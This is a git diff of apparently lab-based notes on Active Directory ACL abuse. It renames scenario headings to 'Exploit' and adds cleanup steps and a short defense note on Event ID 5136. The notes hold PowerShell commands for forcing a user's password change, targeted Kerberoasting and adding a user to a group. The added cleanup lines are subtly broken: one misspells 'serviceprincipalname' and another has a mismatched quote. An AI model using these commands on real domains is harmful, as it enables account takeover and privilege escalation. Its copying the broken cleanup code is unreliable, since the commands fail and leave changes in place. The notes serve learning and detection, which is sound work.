@@ -101,7 +101,7 @@ bloodhound
 ## Change password 
 needed controls `GenericAll` or `ForceChangePassword`  
 
-### Scenario
+### Exploit
 Use the `wley` user to change the password for the `damundsen` user
 
 
@@ -125,7 +125,7 @@ Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -
 ## Targeted Kerberoasting
 needed controls `GenericAll` or `GenericWrite`  
 
-### Scenario 
+### Exploit 
 damundsen user have GenericWrite over adunn user so we can do Targeted Kerberoasting
 
 
@@ -146,9 +146,9 @@ use `Rubeus` to catch the ticket also check this [kerberoasting](https://github.
 ```
 
 ### Clean
-
+remove the spn from the user
 ```
-Set-DomainObject -Credential $Cred -Identity <User to remove> -Clear serviceprincipalname -Verbose
+Set-DomainObject -Credential $Cred -Identity <User to remove> -Clear erviceprincipalname -Verbose
 ```
 
 
@@ -156,7 +156,7 @@ Set-DomainObject -Credential $Cred -Identity <User to remove> -Clear serviceprin
 needed controls `GenericAll` or `GenericWrite`  
 
 
-### Scenario 
+### Exploit 
 damundsen user have GenericWrite over Help Desk Level 1 group so we can add our selves 
 
 
@@ -174,3 +174,13 @@ Get-ADGroup -Identity "<Group Name>" -Properties * | Select -ExpandProperty Memb
 # add your user
 Add-DomainGroupMember -Identity '<Group Name>' -Members '<User to Add>' -Credential $Cred -Verbose
 ```
+
+### Clean
+remove the user from the group
+```
+Remove-DomainGroupMember -Identity <Group Name>" -Members 'Target User' -Credential $Cred -Verbose
+```
+
+# Defense
+
+Enabling the `Advanced Security Audit Policy` can help in detecting unwanted changes, especially `Event ID 5136: A directory service object was modified` which would indicate that the domain object was modified
